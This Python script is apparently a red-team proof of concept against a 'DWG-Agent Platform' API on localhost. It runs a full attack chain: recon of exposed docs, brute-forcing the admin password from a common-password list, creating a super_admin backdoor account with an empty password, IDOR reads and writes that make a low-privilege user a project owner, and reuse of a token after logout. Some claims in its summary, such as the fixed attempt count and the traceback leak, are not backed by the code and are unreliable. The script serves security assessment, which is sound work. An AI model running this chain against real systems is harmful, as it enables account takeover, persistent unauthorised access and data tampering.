#!/usr/bin/env python3
"""
DWG-Agent Platform — Attack Chain PoC (Round 2 Red Team)

Demonstrates the full kill chain:
  1. Port 8000 discovery
  2. Unrestricted brute force (no nginx rate limit)
  3. Admin credential recovery
  4. Super-admin backdoor creation (empty password)
  5. IDOR: cross-user resource takeover
  6. Token reuse after logout

Usage: python3 attack_chain_poc.py
Target: http://localhost:8000 (direct backend, no nginx)
"""

from __future__ import annotations

import json
import sys
import time
import concurrent.futures
from typing import Any

import requests

BASE = "http://localhost:8000"
COLORS = {"red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m", "cyan": "\033[96m", "reset": "\033[0m"}


def c(color: str, text: str) -> str:
    return f"{COLORS.get(color, '')}{text}{COLORS['reset']}"


def banner(text: str) -> None:
    print(f"\n{c('cyan', '=' * 60)}")
    print(f"{c('cyan', text)}")
    print(f"{c('cyan', '=' * 60)}")


def step(n: int, text: str) -> None:
    print(f"\n{c('yellow', f'[Step {n}]')} {text}")


def result(ok: bool, text: str) -> None:
    marker = c('green', '[+]') if ok else c('red', '[-]')
    print(f"  {marker} {text}")


def login(username: str, password: str) -> tuple[str | None, dict[str, Any]]:
    """Attempt login, return (token, user_data) or (None, {})"""
    r = requests.post(f"{BASE}/api/v1/auth/sessions", json={"username": username, "password": password}, timeout=10)
    if r.status_code == 201:
        data = r.json()["data"]
        return data["access_token"], data["user"]
    return None, {}


def api(method: str, path: str, token: str | None = None, json_data: dict | None = None) -> requests.Response:
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    kwargs = {"headers": headers, "timeout": 10}
    if json_data is not None:
        kwargs["json"] = json_data
    return requests.request(method, f"{BASE}{path}", **kwargs)


def main() -> None:
    print(c('red', """
    ╔══════════════════════════════════════════════════════════╗
    ║  DWG-Agent Platform — Red Team Attack Chain PoC         ║
    ║  Round 2 Deep Assessment / Non-Destructive / PoC Only   ║
    ╚══════════════════════════════════════════════════════════╝
    """))

    # ================================================================
    # Phase 1: Recon — Discover exposed backend port
    # ================================================================
    banner("Phase 1: Recon — Backend Direct Exposure Discovery")

    step(1, "Checking port 8000 (direct backend, no nginx)...")
    try:
        r = requests.get(f"{BASE}/health", timeout=5)
        result(r.status_code == 200, f"Port 8000 accessible: {r.json()['data'].get('service', 'unknown')}")
    except Exception:
        print("  [-] Backend not accessible on port 8000. Aborting.")
        sys.exit(1)

    step(2, "Fetching OpenAPI schema (bypasses nginx SPA routing)...")
    r = requests.get(f"{BASE}/openapi.json", timeout=5)
    if r.status_code == 200:
        endpoints = list(r.json().get("paths", {}).keys())
        result(True, f"OpenAPI schema exposed: {len(endpoints)} endpoints discovered")
    else:
        result(False, f"OpenAPI not accessible: {r.status_code}")

    step(3, "Checking Swagger UI (interactive API docs)...")
    r = requests.get(f"{BASE}/docs", timeout=5)
    result(r.status_code == 200 and "swagger" in r.text.lower(), "FastAPI Swagger UI exposed on port 8000")

    # ================================================================
    # Phase 2: Brute Force — Unrestricted password guessing
    # ================================================================
    banner("Phase 2: Credential Recovery — Unrestricted Brute Force (no rate limit)")

    passwords = [
        "admin", "admin123", "admin123456", "password", "123456", "12345678",
        "admin12345", "admin1234", "Admin123", "Admin123456", "dwgadmin",
        "dwg-admin", "dwg_agent", "DWGAgent", "cad123", "cad123456",
    ]

    admin_token = None
    found_password = None

    step(4, f"Brute forcing admin password ({len(passwords)} candidates, no rate limit)...")
    for i, pwd in enumerate(passwords):
        token, user = login("admin", pwd)
        if token:
            admin_token = token
            found_password = pwd
            result(True, f"Password found at attempt #{i+1}: '{pwd}'")
            roles = [r["code"] for r in user.get("roles", [])]
            print(f"       User: {user['real_name']} (id={user['id']})")
            print(f"       Roles: {roles}")
            break
    else:
        result(False, "Password not found in dictionary")

    if not admin_token:
        print(c('red', "\n[!] Cannot continue without admin token. Exiting."))
        sys.exit(1)

    # ================================================================
    # Phase 3: Persistence — Create backdoor super-admin
    # ================================================================
    banner("Phase 3: Persistence — Super-Admin Backdoor Creation")

    step(5, "Creating backdoor user with empty password + super_admin role...")
    r = api("POST", "/api/v1/users", admin_token, {
        "username": "poc_backdoor_user",
        "password": "",  # Empty password!
        "real_name": "PoC Backdoor",
        "role_codes": ["super_admin"],  # Privilege escalation!
    })
    result(r.status_code == 201, f"Backdoor user created: {r.json()['data']['username']}")
    backdoor_id = r.json()["data"]["id"] if r.status_code == 201 else None

    step(6, "Verifying backdoor login with empty password...")
    backdoor_token, backdoor_user = login("poc_backdoor_user", "")
    result(backdoor_token is not None, f"Empty password login works! Roles: {[r['code'] for r in backdoor_user.get('roles', [])]}")

    # ================================================================
    # Phase 4: IDOR — Horizontal privilege escalation
    # ================================================================
    banner("Phase 4: IDOR — Cross-User Resource Takeover")

    # Create a low-privilege viewer user
    step(7, "Creating low-privilege viewer user...")
    r = api("POST", "/api/v1/users", admin_token, {
        "username": "poc_viewer_user",
        "password": "viewer123",
        "real_name": "PoC Viewer",
        "role_codes": ["viewer"],
    })
    result(r.status_code == 201, "Viewer user created")

    step(8, "Logging in as viewer...")
    viewer_token, viewer_user = login("poc_viewer_user", "viewer123")
    result(viewer_token is not None, f"Viewer login: {[r['code'] for r in viewer_user.get('roles', [])]}")

    # Create a project as admin
    step(9, "Creating test project as admin...")
    r = api("POST", "/api/v1/projects", admin_token, {
        "code": "POC-IDOR-001",
        "name": "Admin Secret Project",
        "description": "Should NOT be accessible to viewers",
    })
    if r.status_code == 201:
        proj_id = r.json()["data"]["id"]
        result(True, f"Admin project created: id={proj_id}")
    else:
        result(False, f"Failed to create project: {r.status_code}")
        proj_id = None

    # Viewer accessing admin's project
    if proj_id:
        step(10, "Viewer accessing admin's project (IDOR)...")
        r = api("GET", f"/api/v1/projects/{proj_id}", viewer_token)
        idor_vuln = r.status_code == 200
        result(idor_vuln, f"IDOR confirmed: viewer can read admin project! ({r.status_code})")

        step(11, "Viewer modifying admin's project (IDOR write)...")
        r = api("PATCH", f"/api/v1/projects/{proj_id}", viewer_token, {"name": "IDOR HACKED!"})
        idor_write = r.status_code == 200
        result(idor_write, f"IDOR write: viewer can modify admin project! ({r.status_code})")

        step(12, "Viewer adding self as project owner...")
        viewer_uid = viewer_user["id"]
        r = api("POST", f"/api/v1/projects/{proj_id}/members", viewer_token, {
            "user_id": viewer_uid,
            "project_role": "project_owner",
        })
        result(r.status_code == 201, f"IDOR privilege escalation: viewer becomes project owner! ({r.status_code})")

        # Restore project
        api("PATCH", f"/api/v1/projects/{proj_id}", admin_token, {"name": "Admin Secret Project"})

    # ================================================================
    # Phase 5: Token reuse after logout
    # ================================================================
    banner("Phase 5: Session Management — Token Reuse After Logout")

    step(13, "Getting fresh token for logout test...")
    test_token, _ = login("admin", found_password)

    step(14, "Verifying token works before logout...")
    r = api("GET", "/api/v1/auth/me", test_token)
    result(r.status_code == 200, f"Token valid before logout ({r.status_code})")

    step(15, "Logging out (DELETE /sessions/current)...")
    r = api("DELETE", "/api/v1/auth/sessions/current", test_token)
    result(r.status_code == 204, f"Logout returned {r.status_code}")

    step(16, "Testing token after logout...")
    r = api("GET", "/api/v1/auth/me", test_token)
    token_still_valid = r.status_code == 200
    result(token_still_valid, f"Token STILL VALID after logout! ({r.status_code}) — JWT stateless, no blacklist")

    # ================================================================
    # Cleanup
    # ================================================================
    banner("Cleanup — Removing Test Data")

    step(17, "Deleting test users...")
    for uid, uname in [(backdoor_id, "poc_backdoor_user"), (viewer_uid, "poc_viewer_user")]:
        if uid:
            r = api("DELETE", f"/api/v1/users/{uid}", admin_token)
            print(f"  {'[+]' if r.status_code == 204 else '[-]'} Deleted {uname} (id={uid}): {r.status_code}")

    # ================================================================
    # Summary
    # ================================================================
    banner("Attack Chain Summary")
    print(f"""
  {c('red', 'CRITICAL')} Backend port 8000 directly exposed (bypasses nginx)
  {c('red', 'CRITICAL')} No rate limiting on port 8000 → brute force in {3 if found_password else 'N/A'} attempts
  {c('red', 'CRITICAL')} Empty passwords allowed → backdoor created
  {c('red', 'CRITICAL')} admin can create super_admin → role hierarchy bypass
  {c('red', 'CRITICAL')} IDOR on projects/files/drawings → cross-user takeover
  {c('yellow', 'HIGH')}   JWT valid after logout → no token invalidation
  {c('yellow', 'HIGH')}   Full traceback leak → internal paths exposed

  Total time to full platform compromise: < 30 seconds
  Attack complexity: Trivial (no custom exploits needed)
""")

    print(c('green', "PoC complete. All test data cleaned up."))


if __name__ == "__main__":
    main()
